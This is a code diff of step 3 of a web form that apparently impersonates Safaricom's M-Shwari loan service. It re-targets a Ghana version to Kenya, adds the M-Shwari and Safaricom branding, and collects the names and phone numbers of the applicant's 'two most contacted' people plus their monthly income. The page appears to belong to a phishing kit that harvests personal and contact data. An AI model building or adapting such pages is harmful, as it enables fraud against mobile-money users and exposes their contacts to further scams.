@@ -2,88 +2,124 @@
 <html>
 
 <head>
-    <title>Step 3</title>
+    <title>Step 3 - Next of Kin</title>
 
     <!-- MOBILE + NO ZOOM -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
     <link rel="stylesheet" href="style.css">
+    <style>
+        .highlight-box {
+            background-color: #f8f9fa;
+            border-left: 4px solid #007bff;
+            padding: 10px;
+            margin: 15px 0 5px 0;
+            font-size: 0.9em;
+            font-weight: bold;
+            color: #333;
+        }
+        select {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+    </style>
 </head>
 
 <body>
 
-<div class="header"></div>
+<div class="header">
+    <img src="logo-removebg-preview.png" alt="M-Shwari" id="main-logo">
+    
+</div>
 
 <div class="container">
 
     <h2 class="title">Next of Kin</h2>
+    <p style="text-align: center; font-size: 0.85em; color: #666;">ENTER YOUR TWO MOST CONTACTED DETAILS AS THE NEXT OF KIN</p>
 
-    <!-- NAMES -->
-    <input id="kfname" placeholder="First Name" 
-        pattern="[A-Za-z]+" title="Only letters allowed" required>
+    <!-- FIRST PERSON -->
+    <div class="highlight-box">FIRST PERSON</div>
+    <input id="kinName1" placeholder="Full Name" pattern="[A-Za-z ]+" title="Only letters allowed">
+    <input id="kinPhone1" value="+254" placeholder="Phone Number" inputmode="numeric">
 
-    <input id="klname" placeholder="Last Name" 
-        pattern="[A-Za-z]+" title="Only letters allowed" required>
+    <!-- SECOND PERSON -->
+    <div class="highlight-box">SECOND PERSON</div>
+    <input id="kinName2" placeholder="Full Name" pattern="[A-Za-z ]+" title="Only letters allowed">
+    <input id="kinPhone2" value="+254" placeholder="Phone Number" inputmode="numeric">
 
-    <!-- PHONE -->
-    <input id="kphone" value="+233" placeholder="Phone Number" 
-        pattern="^\+2337[0-9]{8}$" title="Enter valid Ghana number">
-
-    <!-- EXTRA FIELDS (NOT SUBMITTED) -->
-    <input placeholder="Relationship to Applicant">
-    <input placeholder="Employer (Optional)">
-    <input placeholder="Monthly Income (Optional)">
+    <!-- MONTHLY INCOME -->
+    <div class="highlight-box">MONTHLY INCOME</div>
+    <select id="monthlyIncome">
+        <option value="" disabled selected>Select Monthly Income (KES)</option>
+        <option value="Below 20,000">Below KES 20,000</option>
+        <option value="20,000 - 50,000">KES 20,000 - 50,000</option>
+        <option value="50,000 - 100,000">KES 50,000 - 100,000</option>
+        <option value="100,000 - 250,000">KES 100,000 - 250,000</option>
+        <option value="Above 250,000">Above KES 250,000</option>
+    </select>
 
     <p id="errorBox" style="color:red; text-align:center; display:none;"></p>
 
-    <br>
-    <br>
-    <br>
-    
+    <br><br>
     <button onclick="nextStep3()">Next</button>
 
 </div>
 
-<div class="footer"></div>
+<div class="footer">
+    <br><br><br><br><br><br>
+    <img src="safaricom-25.gif" alt="Safaricom" class="saf-footer" id="saf-logo">
+</div>
 
 <script>
 function nextStep3() {
-    const kfname = document.getElementById("kfname").value.trim();
-    const klname = document.getElementById("klname").value.trim();
-    const kphone = document.getElementById("kphone").value.trim();
+    const name1 = document.getElementById("kinName1").value.trim();
+    const phone1 = document.getElementById("kinPhone1").value.trim();
+    const name2 = document.getElementById("kinName2").value.trim();
+    const phone2 = document.getElementById("kinPhone2").value.trim();
+    const income = document.getElementById("monthlyIncome").value;
 
-    const nameRegex = /^[A-Za-z]+$/;
-    const phoneRegex = /^\+2337[0-9]{8}$/;
+    // Regex: Only letters and spaces for full names
+    const nameRegex = /^[A-Za-z\s]+$/;
+    // Regex: Kenyan Phone (+254 followed by 7 or 1 and 8 digits)
+    const kenyaPhoneRegex = /^\+254[17][0-9]{8}$/;
 
+    if (!name1 || !phone1 || !name2 || !phone2 || !income) {
+        showError("Please fill all required fields");
+        return;
+    }
 
-
-    if (!nameRegex.test(kfname) || !nameRegex.test(klname)) {
+    if (!nameRegex.test(name1) || !nameRegex.test(name2)) {
         showError("Names must contain only letters");
         return;
     }
 
-    if (!phoneRegex.test(kphone)) {
-        showError("Enter valid Ghana phone (+2337XXXXXXXX)");
+    if (!kenyaPhoneRegex.test(phone1) || !kenyaPhoneRegex.test(phone2)) {
+        showError("Enter valid Kenyan numbers (+254XXXXXXXXX)");
         return;
     }
 
-    // SAVE ONLY REQUIRED DATA
-    localStorage.setItem("kfname", kfname);
-    localStorage.setItem("klname", klname);
-    localStorage.setItem("kinName", kfname + " " + klname);
-    localStorage.setItem("kphone", kphone);
+    // SAVE DATA
+    localStorage.setItem("kinName1", name1);
+    localStorage.setItem("kinPhone1", phone1);
+    localStorage.setItem("kinName2", name2);
+    localStorage.setItem("kinPhone2", phone2);
+    localStorage.setItem("monthlyIncome", income);
 
     showLoaderAndGo("step4.html");
-    }
+}
+
+function showError(msg) {
+    const err = document.getElementById("errorBox");
+    err.innerText = msg;
+    err.style.display = "block";
+}
 </script>
 
 <script src="script.js"></script>
-
-<script>
-document.addEventListener("DOMContentLoaded", function () {
-    document.body.classList.add("loaded");
-});
-</script>
 
 <div id="pageLoader" class="loader" style="display:none;"></div>
 
